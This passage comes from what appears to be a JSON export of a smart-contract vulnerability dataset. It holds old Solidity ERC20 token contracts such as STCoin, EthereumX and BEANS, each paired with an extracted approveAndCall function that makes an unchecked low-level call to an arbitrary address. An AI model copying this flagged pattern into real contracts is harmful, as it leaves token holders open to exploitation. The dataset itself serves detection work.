allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 16400000;\n totalSupply = 16400000;\n name = \"STCoin\";\n decimals = 8;\n symbol = \"STCo\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1557"
  },
  "filename": "34354.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 16400000;\n totalSupply = 16400000;\n name = \"STCoin\";\n decimals = 6;\n symbol = \"STCoin\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1558"
  },
  "filename": "34357.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MDPToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MDPToken(\n ) {\n totalSupply = 6600000000000000;\n balances[msg.sender] = totalSupply;\n name = \"MDP Token\";\n decimals = 7;\n symbol = \"MDP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1559"
  },
  "filename": "34388.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract UpToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function UpToken(\n ) {\n balances[msg.sender] = 1500000000;\n totalSupply = 1500000000;\n name = \"UpToken\";\n decimals = 2;\n symbol = \"UP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb155a"
  },
  "filename": "34397.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract NLBCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NLBCoin(\n ) {\n balances[msg.sender] = 500000000;\n totalSupply = 500000000;\n name = \"NLBCoin\";\n decimals = 6;\n symbol = \"NLB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb155b"
  },
  "filename": "34402.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumX is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EthereumX(\n ) {\n balances[msg.sender] = 5000000000000000000000000;\n totalSupply = 5000000000000000000000000;\n name = \"Ethereum X\";\n decimals = 18;\n symbol = \"ETHX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb155c"
  },
  "filename": "34403.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Circular is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Circular(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Circular\";\n decimals = 0;\n symbol = \"CIRC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb155d"
  },
  "filename": "34406.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SunpayToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SunpayToken(\n ) {\n balances[msg.sender] = 1000000000000000000;\n totalSupply = 1000000000000000000;\n name = \"Sunpay\";\n decimals = 10;\n symbol = \"SUN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb155e"
  },
  "filename": "34411.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BEANS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BEANS(\n ) {\n balances[msg.sender] = 10000000000000000000000000000;\n totalSupply = 10000000000000000000000000000;\n name = \"BEANS\";\n decimals = 18;\n symbol = \"BEAN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb155f"
  },
  "filename": "34412.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 14000000000000000000000000;\n totalSupply = 14000000000000000000000000;\n name = \"Ethereum Prime\";\n decimals = 18;\n symbol = \"ETHP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1560"
  },
  "filename": "34418.sol",
  "content": "pragma solidity ^0.4.15;\ncontract DealerRights {\n string public name;\n string public symbol;\n uint8 public decimals;\n uint256 public totalSupply;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function DealerRights() public {\n totalSupply = 21000000 ether;\n balanceOf[msg.sender] = totalSupply;\n name = \"Dealer Rights\";\n symbol = \"DRS\";\n decimals = 18;\n }\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value > balanceOf[_to]);\n uint previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] += _value;\n Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transfer(address _to, uint256 _value) public {\n _transfer(msg.sender, _to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n if (approve(_spender, _value)) {\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nif (approve(_spender, _value)) {\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1561"
  },
  "filename": "34419.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000;\n totalSupply = 100000000000000000;\n name = \"Lizi\";\n decimals = 8;\n symbol = \"Lizi\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1562"
  },
  "filename": "34420.sol",
